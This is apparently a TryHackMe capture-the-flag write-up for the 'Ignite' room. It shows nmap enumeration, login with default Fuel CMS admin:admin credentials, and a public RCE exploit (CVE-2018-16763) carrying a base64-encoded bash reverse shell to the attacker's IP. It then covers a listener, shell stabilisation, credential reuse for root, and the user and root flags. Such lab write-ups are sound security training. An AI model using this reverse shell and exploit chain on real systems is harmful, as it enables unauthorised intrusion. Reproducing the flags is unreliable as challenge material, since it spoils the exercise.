---
layout: writeup
title: "Ignite TryHackMe Writeup"
date: 2025-04-30
platform: TryHackMe
---

# TryHackMe Ignite CTF - Writeup

## Target Environment

| Role      | IP              | Interface | OS     | Domain        | Notes      |
|-----------|-----------------|-----------|--------|--------------|------------|
| Attacker  | 10.17.9.93      | tun0      | Linux  | localhost    | Kali/Parrot|
| Victim    | 10.10.116.82    | -         | Ubuntu | ignite.thm   |            |

---

## 1. Reconnaissance & Initial Enumeration

### Port Scanning

Identify open ports on the target:

```shell
sudo nmap --min-rate 10000 -p- 10.10.116.82
-> Output: port 80/tcp found open
```

Service enumeration and version discovery:

```shell
`sudo nmap -sS -sV -sC -A -T4 10.10.116.82`
  PORT   STATE SERVICE VERSION
  80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
  |_http-server-header: Apache/2.4.18 (Ubuntu)
  | http-robots.txt: 1 disallowed entry 
  |_/fuel/
  |_http-title: Welcome to FUEL CMS
```

---

## 2. Web Enumeration

- **CMS Identified:** Fuel CMS 1.4
- **Login Portal:** [http://10.10.116.82/fuel/login/](http://10.10.116.82/fuel/login/)
- **Default Credentials Discovered:**  
  ```text
  Username: admin
  Password: admin
  ```

---

## 3. Exploitation

### Vulnerability: Fuel CMS 1.4 - Remote Code Execution (RCE)

- **Exploit Sourced From:**  
  ```shell
  searchsploit fuel cms
  ```
  Chose exploit: `/usr/share/exploitdb/exploits/php/webapps/50477.py`

- **Exploit Used:**  
  `exploit2.py` (see included file for script details).

- **Modification for Reverse Shell:**  
  The payload in the script was set as:
  ```python
  cmd = "echo L2Jpbi9zaCAtaSA+JiAvZGV2L3RjcC8xMC4xNy45LjkzLzQ0NDQgMD4mMQ== | base64 -d | bash"
  ```
  This decodes and executes a bash reverse shell.

### Command Execution

- **Run exploit:**
  ```shell
  python3 exploit2.py -u http://10.10.116.82
  ```

- **Set up listener on attacker machine:**
  ```shell
  rlwrap ncat -nvlp 4444
  ```

- **Stabilize the shell:**
  - After connection, press `Ctrl+Z` to background the shell.
  - Enter:
    ```shell
    stty raw -echo && fg
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    ```

---

## 4. Post-Exploitation

### User Flag

- **Location:** `/home/www-data/flag.txt`
- **Command:**
  ```shell
  cat /home/www-data/flag.txt
  ```
- **Flag:**  
  ```shell
  6470e394cbf6dab6a91682cc8585059b
  ```

---

## 5. Privilege Escalation

- **Discovered Credentials:**
  - File: `fuel/application/config/database.php`
  - Extracted root credentials from the Fuel CMS config.

- **Switch to root:**
  ```shell
  su root
  ```
- **Root Flag Location:** `/root/root.txt`
  ```shell
  cat /root/root.txt
  ```
- **Flag:**  
  ```shell
  b9bbcb33e11b80be759c4e844862482d
  ```

---

## 6. Summary

- **Initial Foothold:** Default Fuel CMS credentials (`admin:admin`).
- **Remote Code Execution:** Via public exploit (CVE-2018-16763).
- **Shell Stabilization:** PTY and terminal handling for interactive shell.
- **Privilege Escalation:** Re-use of CMS credentials for root access.
- **Flags Captured:** User and root.

---

## Appendix

### Exploit Code Used

See `exploit2.py` for the actual exploit script.
